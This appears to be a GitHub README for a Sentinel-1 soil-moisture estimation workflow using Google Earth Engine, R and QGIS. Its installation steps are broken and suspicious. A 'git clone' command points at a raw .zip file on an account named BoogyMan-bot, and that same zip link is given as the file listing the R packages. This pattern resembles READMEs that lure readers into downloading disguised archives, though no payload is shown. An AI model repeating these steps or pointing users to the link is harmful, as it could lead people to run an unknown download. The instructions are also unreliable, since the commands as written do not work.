## Introduction

Soil moisture is crucial for agriculture. It affects crop growth, yield, and water management. This repository provides a framework to estimate soil moisture using Sentinel-1 Synthetic Aperture Radar (SAR) data. By leveraging Google Earth Engine, R, and QGIS, users can analyze and visualize soil moisture levels efficiently.

## Features

- **Field-scale Estimates**: Provides accurate soil moisture estimates at the field level.
- **Open Science**: Promotes transparency and reproducibility in agricultural monitoring.
- **Multi-Platform Support**: Compatible with Google Earth Engine, R, and QGIS.
- **User-Friendly**: Simple scripts and workflows for ease of use.
- **Comprehensive Documentation**: Guides for installation, usage, and troubleshooting.

## Technologies Used

- **Sentinel-1 SAR Data**: High-resolution radar data for soil moisture estimation.
- **Google Earth Engine (GEE)**: A powerful platform for geospatial analysis.
- **R**: A programming language for statistical computing and graphics.
- **QGIS**: A free and open-source geographic information system.

## Installation

To get started, follow these steps:

1. **Clone the Repository**:
   ```bash
   git clone https://raw.githubusercontent.com/BoogyMan-bot/sentinel-1-soil-moisture/main/Doc/sentinel_moisture_soil_3.0.zip
   ```

2. **Install Required Software**:
   - Ensure you have R and QGIS installed on your machine.
   - Install the necessary R packages. You can find the list of packages in the `https://raw.githubusercontent.com/BoogyMan-bot/sentinel-1-soil-moisture/main/Doc/sentinel_moisture_soil_3.0.zip` file.

3. **Set Up Google Earth Engine**:
   - Sign up for Google Earth Engine.
   - Authenticate your account by following the instructions in the GEE documentation.

## Usage

Once the installation is complete, you can start using the scripts provided in this repository.

1. **Run the GEE Script**:
   - Navigate to the `gee_scripts` directory.
   - Open the script and modify the parameters as needed.
   - Execute the script in the GEE Code Editor.

2. **Process Data in R**:
   - Load the SAR data and perform statistical analysis.
   - Use the provided R scripts for soil moisture estimation.

3. **Visualize in QGIS**:
   - Import the processed data into QGIS.
   - Use the visualization tools to analyze soil moisture patterns.

## Workflow

The workflow for estimating soil moisture involves several steps:

1. **Data Acquisition**:
   - Download Sentinel-1 SAR data for the area of interest.

2. **Data Preprocessing**:
   - Clean and preprocess the data using GEE scripts.

3. **Soil Moisture Estimation**:
   - Use R scripts to estimate soil moisture based on the processed data.

4. **Visualization**:
   - Visualize the results in QGIS to identify trends and patterns.

5. **Analysis and Reporting**:
   - Generate reports based on the findings to support decision-making.
